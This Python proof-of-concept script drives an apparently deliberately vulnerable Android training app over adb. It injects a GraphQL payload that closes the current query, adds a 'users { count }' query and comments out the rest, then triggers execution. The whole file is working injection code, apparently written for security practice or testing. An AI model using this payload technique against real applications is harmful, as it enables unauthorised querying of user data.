#!/usr/bin/env python3
import subprocess
import time
import sys
import re

# Configuration
PACKAGE_NAME = "com.dlh.vulnerapp"
ACTIVITY_NAME = "com.dlh.vulnerapp.GraphQLInjectionActivity"

# The GraphQL Injection Payload
# Original: "}) query { users { count } } #
# This payload closes the previous query param, starts a new query, and comments out the suffix.
RAW_PAYLOAD = '\"}) query { users { count } } #'

def escape_for_adb_shell(text):
    """
    Escapes a string so it can be passed safely to 'adb shell input text'.
    1. Spaces must become '%s'
    2. Bash special chars must be escaped with backslash '\'
    """
    # 1. Replace space with %s (Android input text requirement)
    escaped = text.replace(" ", "%s")
    
    # 2. Escape special shell characters: " \ ) ( } { # ' $ & ; | * < >
    # We use a regex to find them and prepend \
    # Note: We must escape \ first to avoid double escaping
    # Actually, simpler manual replacement for critical chars verified to cause issues
    
    chars_to_escape = ['\\', '"', "'", '(', ')', '{', '}', '#', '&', ';', '|', '*', '$', '<', '>']
    
    final_str = ""
    for char in escaped:
        if char in chars_to_escape:
            final_str += "\\" + char
        else:
            final_str += char
            
    return final_str

def run_adb_cmd(cmd_list):
    """Run an ADB command and return output."""
    try:
        # print(f"[DEBUG] Running: {' '.join(cmd_list)}")
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        if result.stderr:
            pass # print(f"[DEBUG] Stderr: {result.stderr.strip()}")
        return result.stdout.strip()
    except Exception as e:
        print(f"[!] Error running command: {e}")
        return ""

def main():
    print("=== GraphQL Injection PoC (Robust Version) ===")
    
    # 1. Check Device
    devices = run_adb_cmd(['adb', 'devices'])
    if "device" not in devices.replace("List of devices attached", "").strip():
        print("[-] No device connected.")
        sys.exit(1)

    # 2. Launch Activity
    print(f"[*] Launching {ACTIVITY_NAME}...")
    run_adb_cmd(['adb', 'shell', 'am', 'start', '-n', f"{PACKAGE_NAME}/{ACTIVITY_NAME}"])
    time.sleep(3)

    # 3. Ensure Focus on Input Field
    print("[*] Setting focus on Input Field...")
    # Safe bet: Tap roughly in the upper third of the screen (typically where Input is)
    # Coordinates: X=500, Y=500 (Common for 1080p screens under Action Bar)
    run_adb_cmd(['adb', 'shell', 'input', 'tap', '500', '500'])
    time.sleep(1)
    
    # 4. Clear Input Field (CTRL+A, DEL)
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_CTRL_Left', 'KEYCODE_A']) # Select All (might fail on some keyboards)
    # Alternative: Just spam DEL a few times or assume empty
    for _ in range(20):
        run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '67']) # KEYCODE_DEL
    
    # 5. Type Payload
    escaped_payload = escape_for_adb_shell(RAW_PAYLOAD)
    print(f"[*] Injecting payload: {RAW_PAYLOAD}")
    # print(f"[*] Escaped for Shell: {escaped_payload}")
    
    # Run the input text command
    output = run_adb_cmd(['adb', 'shell', 'input', 'text', escaped_payload])
    
    time.sleep(1)

    # 6. Trigger Execution (TAB + ENTER)
    print("[*] Sending TAB + ENTER to click 'Execute Query'...")
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_TAB'])
    time.sleep(0.5)
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '66']) # KEYCODE_ENTER
    
    print("\n[+] PoC Completed.")
    print("[*] Check device screen for injected 'query { users { count } }'")

if __name__ == "__main__":
    main()
